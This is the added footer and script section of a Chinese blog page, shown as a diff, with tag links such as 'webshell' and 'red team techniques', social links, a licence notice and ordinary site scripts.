+          
+          
+            <a class="ui label" href="/tags/webshell/" title="webshell">
+              webshell
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/wifi/" title="WiFi">
+              WiFi
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" title="红队技术">
+              红队技术
+            </a>
+          
+          </div>
+    
+
+    
+  </div>
+</header>
+
+
+<div class="ui relaxed grid dream-grid dream-back">
+  
+  
+  
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment">
+      <div class="ui medium header">社交链接</div>
+      <nav class="ui secondary menu dream-menu dream-socials">
+  
+  <a class="item" href="/index.xml">
+    <i class="large rss square icon" title="RSS"></i>
+  </a>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <a class="item" href="https://github.com/https://github.com/rebootORZ/" target="_blank">
+    <i class="large github icon" title="GitHub"></i>
+  </a>
+  
+
+  
+
+  
+
+  
+</nav>
+
+    </article>
+  </div>
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+    <article class="ui segment">
+      <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。<br /><br />背景使用了 <a href="https://www.pexels.com/zh-cn/" target="_blank">Pexels</a> 上 <a href="https://www.pexels.com/zh-cn/@minan1398" target="_blank">Min An</a> 拍摄的<a href="https://www.pexels.com/zh-cn/photo/1454794/" target="_blank">图片</a>。
+    </article>
+    
+  </div>
+
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.js" integrity="sha256-CgSoWC9w5wNmI1aN8dIMK+6DPelUEtvDr+Bc2m/0Nx8=" crossorigin="anonymous"></script>
+
+    
+    <div class="ui segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="搜索" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('https:\/\/rebootorz.github.io/index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: false,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+
+    <script>
+  window.background = "#fff"
+  window.defaultDark =  null 
+  window.backgroundDark =  null 
+  window.backgroundImageDark = "/me/light_background.jpeg"
+  window.darkNav =  true 
+  window.maxTags =  null 
+  window.hasTwitterEmbed =  null 
+  window.fixedNav =  null 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/js/jquery.overlayScrollbars.min.js" integrity="sha256-tBd38uWlvgfps3zHPrUb2ePBg+Z8EjMf0QloFONzpvU=" crossorigin="anonymous"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+
+
+<script src="https://cdn.jsdelivr.net/npm/luxon@1.26.0" integrity="sha256-4sbTzmCCW9LGrIh5OsN8V5Pfdad1F1MwhLAOyXKnsE0=" crossorigin="anonymous"></script>
+<script>
+  format()
+
+  function format() {
+    $('span[data-format="luxon"]').each(function () {
+      var date = $(this).text()
+
+      $(this).text(luxon.DateTime.fromISO(date, { locale: "zh" }).toFormat("yyyy年MM月dd日"))
+    })
+  }
+</script>
+
+
+
+<script src="/js/scrollToTop.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.1/dist/html2canvas.min.js" integrity="sha256-uacRffSSMP9qpvNWhVmYLykBv9YKMA1d/VSIN1AmfyQ=" crossorigin="anonymous"></script>
+<script src="/js/post.js" defer></script>
+
+
+    
+
+    
+  </body>
+</html>
